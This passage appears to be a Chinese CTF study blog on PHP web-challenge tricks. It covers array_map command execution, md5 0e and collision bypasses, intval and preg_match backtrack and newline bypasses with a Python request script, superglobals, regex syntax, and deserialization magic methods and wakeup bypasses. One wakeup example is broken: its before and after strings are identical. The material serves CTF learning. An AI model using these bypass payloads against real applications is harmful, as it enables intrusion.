<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cube</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$n</span> * <span class="variable">$n</span> * <span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;cube&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">    [1] =&gt; 8</span><br><span class="line">    [2] =&gt; 27</span><br><span class="line">    [3] =&gt; 64</span><br><span class="line">    [4] =&gt; 125</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>命令执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="variable">$old_array</span>[<span class="number">0</span>] = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$old_array</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$new_array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="php函数绕过"><a href="#php函数绕过" class="headerlink" title="php函数绕过"></a>php函数绕过</h1><p>md5(Array()) &#x3D; null<br>sha1(Array()) &#x3D; null<br>ereg(pattern,Array()) &#x3D;null<br>preg_match(pattern,Array()) &#x3D; false<br>strcmp(Array(), “abc”) &#x3D;null<br>strpos(Array(),“abc”) &#x3D; null<br>strlen(Array()) &#x3D; null</p>
<h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><h3 id="0e绕过"><a href="#0e绕过" class="headerlink" title="0e绕过"></a>0e绕过</h3><p>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</p>
<p>数组绕过</p>
<p>var_dump(md5($_GET[‘a’]) &#x3D;&#x3D; md5($_GET[‘b’]))<br>1<br>传入</p>
<p>a[]&#x3D;a&amp;b[]&#x3D;b<br>虽然会报错，但是判断为真</p>
<p>可以看到，MD5一个数组返回了null，null&#x3D;&#x3D;null，成功绕过</p>
<ol start="3">
<li>强类型绕过<br>if((string)$_POST[‘a’] !&#x3D;&#x3D; (string)$_POST[‘b’] &amp;&amp; md5($_POST[‘a’]) &#x3D;&#x3D;&#x3D; md5($_POST[‘b’]))</li>
</ol>
<p>md5 碰撞</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>进行url解码后的MD5值相等</p>
<p>收录一些MD5值相等的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line"></span><br><span class="line">$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;</span><br><span class="line">$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="a-x3D-x3D-md5-a"><a href="#a-x3D-x3D-md5-a" class="headerlink" title="$a&#x3D;&#x3D;md5($a)"></a>$a&#x3D;&#x3D;md5($a)</h3><p>0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等</p>
<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>intval() 函数可以获取变量的「整数值」。常用于强制类型转换</p>
<p>直到遇上数字或正负符号才开始做转换，再遇到非数字或<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>结束时，结束转换</p>
<p>intval($id)会从字符串$id的起始位置开始去数字碰到非数字就结束,当起始位置为非数字时则为0。<br>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intval(‘100a123’)=100</span><br><span class="line">intval(‘a123’)=0</span><br><span class="line">`?id=&#x27;1000&#x27; //&quot;1000&quot;或(1000)皆可</span><br><span class="line">?id=125&lt;&lt;3 //左移</span><br><span class="line">?id=680|320 //按位或</span><br><span class="line">?id=992^8 //按位异或</span><br><span class="line">?id=~~1000 //两次取反</span><br><span class="line">?id=0x3e8 //十六进制</span><br><span class="line">?id=0b1111101000 //二进制`</span><br></pre></td></tr></table></figure>

<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><h3 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>pcre.backtrack_limit</code>给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://.ctf.show:8080/&quot;</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=ctfshow[]</span><br></pre></td></tr></table></figure>

<h3 id="换行绕过"><a href="#换行绕过" class="headerlink" title="换行绕过"></a>换行绕过</h3><p><code>.</code>不会匹配换行符，如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^.*(flag).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="variable">$json</span><span class="operator">=</span><span class="string">&quot;<span class="subst">\n</span>flag&quot;</span></span><br></pre></td></tr></table></figure>

<p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^flag$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] !== <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要传入</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?a=flag%0a</span><br></pre></td></tr></table></figure>



<h1 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h1><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><table>
<thead>
<tr>
<th>元素&#x2F;代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>$_SERVER[‘PHP_SELF’]</td>
<td>返回当前执行脚本的文件名。</td>
</tr>
<tr>
<td>$_SERVER[‘GATEWAY_INTERFACE’]</td>
<td>返回服务器使用的 CGI 规范的版本。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_ADDR’]</td>
<td>返回当前运行脚本所在的服务器的 IP 地址。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_NAME’]</td>
<td>返回当前运行脚本所在的服务器的主机名。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_SOFTWARE’]</td>
<td>返回服务器标识字符串（比如 Apache&#x2F;2.2.24）。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_PROTOCOL’]</td>
<td>返回请求页面时通信协议的名称和版本（例如，“HTTP&#x2F;1.0”）。</td>
</tr>
<tr>
<td>$_SERVER[‘REQUEST_METHOD’]</td>
<td>返回访问页面使用的请求方法（例如 POST）。</td>
</tr>
<tr>
<td>$_SERVER[‘REQUEST_TIME’]</td>
<td>返回请求开始时的时间戳（例如 1577687494）。</td>
</tr>
<tr>
<td>$_SERVER[‘QUERY_STRING’]</td>
<td>返回查询字符串，如果是通过查询字符串访问此页面。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_ACCEPT’]</td>
<td>返回来自当前请求的请求头。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td>
<td>返回来自当前请求的 Accept_Charset 头（ 例如 utf-8,ISO-8859-1）</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_HOST’]</td>
<td>返回来自当前请求的 Host 头。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_REFERER’]</td>
<td>返回当前页面的完整 URL（不可靠，因为不是所有用户代理都支持）。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTPS’]</td>
<td>是否通过安全 HTTP 协议查询脚本。</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_ADDR’]</td>
<td>返回浏览当前页面的用户的 IP 地址。</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_HOST’]</td>
<td>返回浏览当前页面的用户的主机名。</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_PORT’]</td>
<td>返回用户机器上连接到 Web 服务器所使用的端口号。</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_FILENAME’]</td>
<td>返回当前执行脚本的绝对路径。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_ADMIN’]</td>
<td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_PORT’]</td>
<td>Web 服务器使用的端口。默认值为 “80”。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_SIGNATURE’]</td>
<td>返回服务器版本和虚拟主机名。</td>
</tr>
<tr>
<td>$_SERVER[‘PATH_TRANSLATED’]</td>
<td>当前脚本所在文件系统（非文档根目录）的基本路径。</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_NAME’]</td>
<td>返回当前脚本的路径。</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_URI’]</td>
<td>返回当前页面的 URI。</td>
</tr>
</tbody></table>
<p>3get_defined_functions(void)</p>
<p>获取所有已经定义的函数,包含内部函数和用户定义的函数。</p>
<p>输出用户定义的函数方法为：</p>
<p>$hhh&#x3D;get_defined_functions();var_dump($hhh[‘user’]);</p>
<p> get_defined_constants(void)</p>
<p>返回所有可用的常量，包含系统常量和用户定义的常量。</p>
<p> get_declared_classes(void)</p>
<p>返回所有可用的类，包含系统类和用户定义的类。</p>
<p>get_included_files()</p>
<p>返回所有的包含的文件路径的数组，included 和 required 的包含文件</p>
<p><strong>需要了解的超全局变量</strong></p>
<p>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚</p>
<p>本的全部作用域中都可用。在函数或方法中无需执</p>
<p>行 global $variable; 就可以访问它们。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_REQUEST</span><br><span class="line">$_POST</span><br><span class="line">$_GET</span><br><span class="line">$_FILES</span><br><span class="line">$_ENV</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br></pre></td></tr></table></figure>

<p> $GLOBALS — 引用全局作用域中可用的全部变量</p>
<p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变</p>
<p>量（从函数或方法中均可）。</p>
<p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量</p>
<p>的名字就是数组的键。</p>
<p>下面的例子展示了如何使用超级全局变量 $GLOBALS：</p>
<p>实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="number">75</span>;</span><br><span class="line"><span class="variable">$y</span> = <span class="number">25</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addition</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&#x27;z&#x27;</span>] = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>] + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">addition</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：95</p>
<p>在上面的例子中，由于 z 是 $GLOBALS 数组中的变量，因此在函数之</p>
<p>外也可以访问它。</p>
<p>2 $_SERVER</p>
<p>$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息。</p>
<p>下面的例子展示了如何使用 $_SERVER 中的某些元素：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://websec.readthedocs.io/zh/latest/basic/index.html</span><br></pre></td></tr></table></figure>

<h1 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h1><p><a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式 – 教程 | 菜鸟教程 (runoob.com)</a></p>
<h2 id="匹配公式语法"><a href="#匹配公式语法" class="headerlink" title="匹配公式语法"></a>匹配公式语法</h2><table>
<thead>
<tr>
<th align="center">量词</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>匹配任何至少包含一个前导字符串</td>
</tr>
<tr>
<td align="center">*</td>
<td>匹配任何包含零个或多个前导字符串</td>
</tr>
<tr>
<td align="center">?</td>
<td>匹配任何包含零个或1个前导字符串</td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配任意一个字符串</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>匹配任何包含x个前导字符串</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>匹配任何包含 x 到 y 个前导字符串</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>匹配任何包含至少x个前导字符串</td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配字符串的行首</td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配字符串的行尾</td>
</tr>
<tr>
<td align="center">|</td>
<td>选择符 匹配字符串的左边或者右边</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">元字符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>匹配任何包含小写字母a-z的字符串</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>匹配任何包含大写字母A-Z的字符串</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>匹配任何包含0-9的字符串</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>匹配任何包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>匹配任何不包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\w</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\W</td>
<td>匹配任何不包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\d</td>
<td>匹配任何包含数字字符</td>
</tr>
<tr>
<td align="center">\D</td>
<td>匹配任何非数字字符</td>
</tr>
<tr>
<td align="center">\s</td>
<td>匹配任何空白字符</td>
</tr>
<tr>
<td align="center">\S</td>
<td>匹配任何非空白字符</td>
</tr>
<tr>
<td align="center">\b</td>
<td>匹配是否到达了单词边界</td>
</tr>
<tr>
<td align="center">\B</td>
<td>匹配没有到达了单词边界</td>
</tr>
<tr>
<td align="center">\</td>
<td>匹配正则中的特殊字符</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>完全不区分大小写</td>
</tr>
<tr>
<td align="center">m</td>
<td>可以采用多行识别,遇到换行也承认匹配规则</td>
</tr>
<tr>
<td align="center">x</td>
<td>忽略掉规则模式中的空白字符</td>
</tr>
<tr>
<td align="center">A</td>
<td>强制从头开始匹配</td>
</tr>
<tr>
<td align="center">U</td>
<td>禁止贪婪匹配，只跟踪到最近的一个匹配符并结束</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>php</tag>
        <tag>小结</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/2024/04/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p> php反序列化</p>
<span id="more"></span>

<h1 id="魔术变量"><a href="#魔术变量" class="headerlink" title="魔术变量"></a>魔术变量</h1><p>触发时机，分组记忆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct  //实例化对象时触发</span><br><span class="line">__destruct  //对象引用完成或对象被销毁反序列化之后</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sleep()  //serialize()之前</span><br><span class="line">__wakeup()  //unserialize()之前</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__tostring() //把对象当作字符串掉用（使用echo print）</span><br><span class="line">__invoke()  //把对象当成函数调用</span><br><span class="line">__clone()  //当使用clone 拷贝完成一个对象</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__call() //调用一个不存在的方法</span><br><span class="line">__callStatic() //静态调用一个不存在的方法</span><br><span class="line">__get()  /调用的成员属性不存在</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__set() //给不存在的成员属性赋值</span><br><span class="line">__isset()  //对不可访问属性使用isset()或empty</span><br><span class="line">__unset()   //对不可访问属性使用unset()</span><br></pre></td></tr></table></figure>

<p><strong>测试之后wakeup()  的触发顺序优先级比destruct更高一点</strong></p>
<p><a href="https://segmentfault.com/a/1190000007250604#item-2-14">PHP之十六个魔术方法详解 - The code - SegmentFault 思否</a></p>
<p>在给不可访问（protected 或 private）或不存在的属性赋值时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> 会被调用。</p>
<p>读取不可访问（protected 或 private）或不存在的属性的值时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> 会被调用。</p>
<p>当对不可访问（protected 或 private）或不存在的属性调用 <a href="https://www.php.net/manual/zh/function.isset.php">isset()</a> 或 <a href="https://www.php.net/manual/zh/function.empty.php">empty()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> 会被调用。</p>
<p>当对不可访问（protected 或 private）或不存在的属性调用 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a> 会被调用。</p>
<p>参数 $name 是指要操作的变量名称。<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> 方法的 $value 参数指定了 $name 变量的值。</p>
<p>callStatic的例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;__call Calling: &#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">      		<span class="keyword">echo</span> <span class="string">&#x27;__call arguments: &#x27;</span>;</span><br><span class="line">      		<span class="title function_ invoke__">print_r</span>(<span class="variable">$arguments</span>);</span><br><span class="line">      		<span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">  		<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;__callStatic Calling: &#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;__callStatic arguments: &#x27;</span>;</span><br><span class="line">    		<span class="title function_ invoke__">print_r</span>(<span class="variable">$arguments</span>);</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line">	<span class="variable">$a</span> -&gt; <span class="title function_ invoke__">ha</span>(<span class="number">1</span>,<span class="string">&#x27;z&#x27;</span>);</span><br><span class="line">	A::<span class="title function_ invoke__">haha</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>打印效果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__call Calling: ha</span><br><span class="line">__call arguments: Array ([0] =&gt; 1 [1] =&gt; z)</span><br><span class="line">__callStatic Calling: haha</span><br><span class="line">__callStatic arguments: Array ()</span><br></pre></td></tr></table></figure>

<h1 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h1><p>对类的大小写不敏感</p>
<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p>preg_match(‘&#x2F;^O:\d+&#x2F;‘)匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点</p>
<p>利用加号绕过（注意在url里传参时+要编码为%2B）<br>serialize(array(a ) ) ; &#x2F; &#x2F; a));&#x2F;&#x2F;a));&#x2F;&#x2F;a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</p>
<p>攻防世界的一道例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="16进制字符绕过"><a href="#16进制字符绕过" class="headerlink" title="16进制字符绕过"></a>16进制字符绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;S:4:&quot;\00*\00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成16进制解析。</span><br></pre></td></tr></table></figure>



<h1 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h1><h2 id="对象属性数量不一样"><a href="#对象属性数量不一样" class="headerlink" title="对象属性数量不一样"></a>对象属性数量不一样</h2><p>适用版本：PHP5 &lt; 5.6.25、PHP7 &lt; 7.0.10</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:“User”:2:&#123;s:3:“age”;i:20;s:4:“name”;s:4:“daye”;&#125;</span><br></pre></td></tr></table></figure>

<p>修改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:“User”:2:&#123;s:3:“age”;i:20;s:4:“name”;s:4:“daye”;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="C绕过"><a href="#C绕过" class="headerlink" title="C绕过"></a>C绕过</h2><p>适用版本：PHP 7.4.0+</p>
<p><strong>愚人杯3rd [easy_php]</strong></p>
